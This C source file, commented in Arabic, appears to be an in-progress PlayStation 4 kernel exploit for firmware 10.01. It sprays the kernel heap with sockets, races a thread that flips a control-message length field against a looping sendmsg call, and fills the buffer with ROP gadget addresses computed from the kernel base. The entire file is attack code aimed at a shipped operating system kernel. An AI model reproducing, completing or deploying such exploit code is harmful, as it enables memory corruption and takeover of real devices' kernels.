#include <ps4.h>

// الإزاحات لنسخة 10.01
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
#define OFF_POP_RAX_RET          0x09974F
#define OFF_RET                  0x0008E0

struct msghdr {
    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
    void *msg_control; uint32_t msg_controllen; int msg_flags;
};
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

#define CONTROL_LEN 256
#define SPRAY_COUNT 256

uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;
int global_sock;
int spray_socks[SPRAY_COUNT];

// دالة تهيئة الذاكرة (التحرير الزوجي الذي أثبت نجاحه في جلب 974f)
void prepare_heap() {
    for(int i = 0; i < SPRAY_COUNT; i++) {
        spray_socks[i] = syscall(97, 2, 2, 0);
        if(spray_socks[i] > 0) {
            uint8_t dummy[0x50];
            memset(dummy, 0, 0x50);
            syscall(133, spray_socks[i], dummy, 0x50, 0, NULL, 0);
        }
    }
    for(int i = 0; i < SPRAY_COUNT; i += 2) {
        if(spray_socks[i] > 0) {
            syscall(6, spray_socks[i]);
            spray_socks[i] = -1;
        }
    }
}

void *sendmsg_thread(void *arg) {
    (void)arg;
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) { syscall(28, global_sock, &msg, 0); }
    return NULL;
}

void *race_thread(void *arg) {
    (void)arg;
    while(1) {
        cmsg->cmsg_len = 0x50;   
        cmsg->cmsg_len = 0xFFFF; 
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    uint64_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint64_t pop_rax = kbase + OFF_POP_RAX_RET;
    uint64_t signature = 0xDEADC0DE;

    // تهيئة الذاكرة
    prepare_heap();

    // بناء البفر "الكثيف"
    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = 7;
    cmsg->cmsg_len = 0x50;

    // ملء منطقة ext_free بتوقيعات متكررة جداً (Spray inside Buffer)
    // نبدأ من 0x48 ونغطي أكبر مساحة ممكنة
    for (int i = 0x48; i < CONTROL_LEN - 32; i += 8) {
        uint64_t *rop = (uint64_t *)(control_buf + i);
        rop[0] = trigger;   // 3ee6
        rop[1] = pop_rax;   // 974f
        rop[2] = signature; // DEADC0DE
        rop[3] = signature; // تكرار للتأكيد في حال وجود Padding من النواة
    }

    global_sock = syscall(97, 2, 2, 0);

    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);
    return 0;
}
